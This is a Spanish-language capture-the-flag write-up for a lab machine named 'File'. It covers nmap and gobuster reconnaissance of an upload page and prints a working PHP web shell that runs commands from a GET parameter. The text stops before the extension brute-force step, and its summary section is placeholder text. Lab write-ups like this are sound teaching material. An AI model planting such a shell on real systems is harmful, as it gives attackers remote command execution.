# File - Writeup

## Resumen
Lorem Ipsum

## Paso N1: Reconocimiento
Empezaremos escaneando los puertos TCP abiertos en la máquina con sus respectivos servicios y versiones
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000 -oG open_ports
```
<img width="670" height="550" alt="image" src="https://github.com/user-attachments/assets/26cff7ca-e2c6-4f5e-81cd-2734e9c4dd0d" />

Podemos ver que están abiertos los puertos 21 y 80 correspondientes a los servicios ftp y http.

En esta máquina especificamente, no profundizaré en el servidor ftp dado a que no tiene información relevante (recomendable entrar para experimentar y sacar criterio propio.)

## Paso N2: Busqueda de subdirectorios
Ya que no hay información relevante en el servidor ftp, empezaremos la busqueda de subdirectorios con ```gobuster```
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html
```
<img width="665" height="538" alt="image" src="https://github.com/user-attachments/assets/33f79738-6930-404a-8232-a3b79d8227e1" />

Vemos que tenemos los subdirectorios ```/uploads/``` y ```/file_upload.php``` disponibles.

Al entrar a ```/uploads/``` podemos ver que es un **Directory Listing**
<img width="520" height="196" alt="image" src="https://github.com/user-attachments/assets/251d4842-d4ee-4a09-9244-5e9a007250c0" />

No hay mucho que hacer aqui.

Al entrar a ```/file_upload.php```
<img width="673" height="128" alt="image" src="https://github.com/user-attachments/assets/fa98bbc6-3830-4a65-af8b-2327c4512330" />

Podemos ver que que nos deja subir un archivo, por lo que pasaremos a explotar esta función.

## Paso N3: Ejecutando código
La idea es hacer que la página ejecute código php para desde ahí poder trabajar, por lo que creamos el script malicioso:
```
echo '<?php        
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
<form method="GET">
    <input type="text" name="cmd" placeholder="Escribe tu comando aquí" style="width:400px">
    <input type="submit" value="Ejecutar">
</form>' > script.php
```
Si lo intentamos subir, nos dirá ```No se ha cargado ningun archivo o hubo un error.```

Es probable que lo que esté fallando sea la extensión, por lo que intentaremos interceptar la petición y hacerle fuerza bruta a las extensiones a ver cuál de todas nos permite subirla correctamente.


